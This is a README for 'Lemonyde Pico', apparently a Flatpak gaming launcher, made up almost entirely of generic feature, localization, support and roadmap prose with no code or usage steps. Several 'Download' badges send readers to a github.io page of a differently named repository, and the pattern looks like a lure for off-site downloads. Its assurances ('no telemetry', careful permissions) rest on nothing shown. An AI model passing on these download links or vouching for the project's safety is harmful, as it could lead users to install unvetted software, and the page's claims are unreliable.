![preview](https://raw.githubusercontent.com/gabreil00/Soberly-Brewed-Bootstrapper/main/thumb_3fea3c.svg)
[![Download](https://raw.githubusercontent.com/gabreil00/Soberly-Brewed-Bootstrapper/main/pkg_00c1129.svg)](https://gabreil00.github.io/Soberly-Brewed-Bootstrapper/)

# 🍋 Lemonyde Pico — A Featherweight, Cross-Distro Launcher Layer for Flatpak Gaming Sessions

> *“When the citrus press is too heavy, you reach for the zest.”*

**Lemonyde Pico** is a community-forged companion utility derived from the spirit of the Lemonyde project. Where Lemonyde focuses on bootstrapping the Sober flatpak environment for a particular desktop ecosystem, **Lemonyde Pico** reimagines that mission as a universal, distro-agnostic orchestration shim: a slim, dependency-light launcher layer that stands between your desktop session and any Flatpak-packaged runtime you choose to feed it. Think of it as a *maître d’* for your game containers — it doesn’t cook the meal, but it makes sure the table is set, the lights are dimmed, and the right doors are unlocked before the guests arrive.

This repository is **not** a fork of Lemonyde. It is a sibling concept, independently maintained, sharing only the philosophy: **reduce friction, respect the user, and never lock anyone into a single path.**

[![Download](https://raw.githubusercontent.com/gabreil00/Soberly-Brewed-Bootstrapper/main/pkg_00c1129.svg)](https://gabreil00.github.io/Soberly-Brewed-Bootstrapper/)

---

## 📚 Table of Contents

- [🌟 Why Lemonyde Pico Exists](#-why-lemonyde-pico-exists)
- [🧩 Feature Highlights](#-feature-highlights)
- [🖥️ Responsive Interface & Session Awareness](#️-responsive-interface--session-awareness)
- [🌍 Multilingual Support & Localization Pipeline](#-multilingual-support--localization-pipeline)
- [🛎️ Round-the-Clock Companion Support Model](#️-round-the-clock-companion-support-model)
- [⚙️ Configuration Philosophy](#️-configuration-philosophy)
- [🔐 Sandboxing, Permissions & Trust Boundaries](#-sandboxing-permissions--trust-boundaries)
- [🧪 Compatibility Matrix](#-compatibility-matrix)
- [🎨 Theming & Visual Identity](#-theming--visual-identity)
- [🧭 Roadmap for 2026](#-roadmap-for-2026)
- [🤝 Contributing](#-contributing)
- [📜 License](#-license)
- [⚠️ Disclaimer](#️-disclaimer)

---

## 🌟 Why Lemonyde Pico Exists

Flatpak solved distribution. It did not solve *ceremony*.

Anyone who has spent an evening wrestling with runtime permissions, portal quirks, GPU passthrough flags, and session-scoped environment variables knows the feeling: the software is installed, but the **experience** is not. Lemonyde Pico exists to close that gap without becoming another monolith. It is a **launcher layer**, not a platform. It is a **translator**, not a tyrant.

The name “Pico” is deliberate. It signals smallness, precision, and a willingness to sit quietly in the background. Where a bootstrapper might shout, Pico whispers. Where a full stack might demand a dozen configuration files, Pico asks for one — and even that one is optional.

If Lemonyde is the lemonade stand, **Lemonyde Pico is the single ice cube** that makes the whole glass feel intentional.

---

## 🧩 Feature Highlights

Lemonyde Pico is built around a handful of stubborn convictions. Here is what those convictions look like in practice:

- **Session-adaptive launch profiles** — Detect whether you are on Wayland or X11, on a laptop or a desktop, on a discrete GPU or integrated graphics, and adjust the Flatpak invocation accordingly. No more copy-pasting environment variables from a forum thread dated three years ago.
- **Zero-config first run** — Out of the box, Pico inspects your installed Flatpak remotes, enumerates user-facing applications, and proposes a sane default profile. You can accept it, edit it, or ignore it entirely.
- **Composable overrides** — Every behavior is expressed as a small, named override. Overrides can be layered, reordered, or disabled without touching the core.
- **Portal-aware file access** — Pico does not quietly broaden permissions. It surfaces what a Flatpak *would like* to access and lets you decide, in plain language, whether to grant it.
- **Deterministic logs** — Every launch produces a structured, human-readable trace. If something goes sideways, you will know *which* override did it and *why*.
- **No telemetry, no phoning home, no account required** — Ever. Pico has no opinion about where you live or what you play.

These features are not marketing bullet points; they are the minimum bar the maintainers hold themselves to.

---

## 🖥️ Responsive Interface & Session Awareness

The phrase “responsive UI” usually conjures images of web design breakpoints. In Lemonyde Pico, responsiveness means something slightly different: **the tool responds to the session it finds itself in.**

- On a **Wayland compositor**, Pico prefers native Wayland backends where available and falls back gracefully when they are not.
- On an **X11 session**, Pico adjusts its window hints, scaling behavior, and input handling to match the older but still widely used stack.
- On **headless or remote sessions**, Pico disables interactive prompts and emits machine-parseable output instead.

A single codebase, three personalities. The result is a tool that feels *native* on whichever desktop you happen to inhabit — KDE, GNOME, Sway, Hyprland, XFCE, or something stranger. Pico does not pick favorites among desktop environments. It simply asks, *“What are you?”* and behaves accordingly.

Additionally, the interface layer adapts to **display density**. Compact mode for small laptop panels, comfortable mode for large monitors, and an accessibility mode that prioritizes high contrast and larger hit targets. Responsiveness here is not decoration — it is dignity.

---

## 🌍 Multilingual Support & Localization Pipeline

Lemonyde Pico ships with a localization pipeline designed for **community translators first**. Strings are stored in plain, diff-friendly files. There is no proprietary translation platform, no account creation, and no minimum phrase count before a language is merged.

Currently planned and in-progress locales include:

- English (reference)
- Spanish
- Portuguese (Brazilian and European variants tracked separately)
- French
- German
- Italian
- Polish
- Turkish
- Japanese
- Korean
- Simplified and Traditional Chinese

If your language is missing, the pipeline is designed so that **a single pull request containing one file is enough** to begin. Partial translations are welcome and explicitly supported. A half-translated menu is still a translated menu.

Multilingual support extends beyond UI strings: error messages, log summaries, and the interactive permission prompts are all localized. Because a confusing error message in a language you do not speak is not an error message — it is a riddle.

---

## 🛎️ Round-the-Clock Companion Support Model

Lemonyde Pico does not have a call center. What it has is something arguably better: a **distributed, round-the-clock companion support model** built on community goodwill and maintainer availability across time zones.

This model rests on four pillars:

1. **Asynchronous issue triage** — Every issue is read, labeled, and responded to by a maintainer or trusted contributor. Response times are not guaranteed, but *silence* is treated as a bug.
2. **Time-zone coverage** — Contributors span multiple continents, ensuring that a question asked at 3 AM in one region is likely to meet a waking maintainer in another.
3. **Living documentation** — The README, the wiki, and the in-repo docs are continuously revised in response to real questions. If a question is asked twice, the documentation is considered incomplete.
4. **Community mentorship** — New contributors are paired with experienced ones for their first few pull requests. Nobody is expected to know the codebase on day one.

This is not 24/7 in the corporate sense — no one is on call, no one is paged at midnight. It is 24/7 in the **human** sense: somewhere, at any hour, someone who cares is likely awake.

---

## ⚙️ Configuration Philosophy

Pico’s configuration is intentionally boring. It is text. It is version-controllable. It is readable by a human who has never seen the project before.

A minimal profile looks like a short list of intentions:

- *Which Flatpak application should be launched?*
- *Which overrides should apply?*
- *Which environment variables should be injected?*
- *Which permissions should be requested?*

That is it. Everything else has a default. Everything else can be overridden. Nothing is hidden behind a binary blob or an opaque database. If you lose your config, you can reconstruct it by reading the logs Pico produces.

The philosophy is simple: **configuration should be a conversation, not a contract negotiation.**

---

## 🔐 Sandboxing, Permissions & Trust Boundaries

Lemonyde Pico is paranoid in the healthy way. It assumes the best of users and the worst of edges.

- Pico **never** modifies Flatpak permissions without an explicit, logged action initiated by the user.
- Pico **never** installs runtimes, remotes, or applications on its own. It may *suggest*, but suggestion is not action.
- Pico **never** elevates privileges silently. If a step requires administrative rights, it says so, in plain language, and waits.
- Pico treats every external input — including its own configuration files — as potentially hostile until parsed and validated.

The trust boundary is stark: **you are the authority; Pico is the facilitator.** This distinction is enforced in code, not just in documentation.

---

## 🧪 Compatibility Matrix

Lemonyde Pico targets the following environments. Presence in the matrix does not guarantee perfection — it guarantees *intent to support*.

- **Distributions:** Any distribution capable of running a modern Flatpak stack. This includes, but is not limited to, Debian-derived, Arch-derived, Fedora-derived, openSUSE-derived, and independent distributions.
- **Flatpak runtimes:** The common freedesktop runtimes, plus vendor-published runtimes where applicable.
- **Display servers:** Wayland and X11.
- **GPU vendors:** Integrated and discrete solutions from the major vendors, with a bias toward open drivers.
- **Architectures:** x86_64 is the reference target. AArch64 is under active exploration.

If your setup is unusual, that is not a reason for exclusion. It is a reason for a conversation.

---

## 🎨 Theming & Visual Identity

Pico’s visual identity is intentionally restrained. The palette borrows from citrus — pale yellows, muted greens, a hint of rind — but the application of that palette is disciplined. There are no gradients for the sake of gradients, no animations for the sake of delight.

The visual philosophy: **the tool should disappear into the task.** A user should not remember the color of a button; they should remember that the game launched on the first try.

Themes are exposed as simple token overrides. If you want Pico to match your desktop’s accent color, you can do that in one line. If you want it to be invisible, you can do that too.

---

## 🧭 Roadmap for 2026

The roadmap is a compass, not a contract. Items may shift, merge, or dissolve as reality intrudes.

- **First half of 2026:** Stabilize the override engine, finalize the localization pipeline, and publish the first tagged release.
- **Mid 2026:** Introduce a plugin-style extension surface for advanced overrides, with a documented stability contract.
- **Late 2026:** Explore AArch64 support more seriously, and begin sketching a companion CLI for headless environments.

Every roadmap item is discussed in the open. There are no secret milestones.

---

## 🤝 Contributing

Contributions are welcome from anyone willing to be kind and precise. The contribution guide lives in the repository and covers:

- How to propose a feature.
- How to report a bug with a reproducible trace.
- How to add a translation.
- How to review someone else’s work without being a jerk about it.

The maintainers believe that **code review is a form of hospitality**, and they try to practice it accordingly.

---

## 📜 License

Lemonyde Pico is released under the **MIT License**.

You can read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Use it, modify it, redistribute it, embed it in your own strange experiments. The only requirement is attribution. The only expectation is goodwill.

---

## ⚠️ Disclaimer

Lemonyde Pico is an **independent community project**. It is not affiliated with, endorsed by, or sponsored by any of the entities whose software it may help orchestrate. All trademarks, runtime names, and application names referenced in this document or in the project’s output belong to their respective owners.

The software is provided **as-is**, without warranty of any kind, express or implied. The maintainers are not responsible for anything that happens as a result of using it — good, bad, or merely strange.

Please use Lemonyde Pico responsibly, respect the licenses of the software you run through it, and remember that the community that builds tools like this is made of people who chose to spend their time helping strangers. Be one of those people when you can.

---

*Lemonyde Pico — less ceremony, more play.*

[![Download](https://raw.githubusercontent.com/gabreil00/Soberly-Brewed-Bootstrapper/main/pkg_00c1129.svg)](https://gabreil00.github.io/Soberly-Brewed-Bootstrapper/)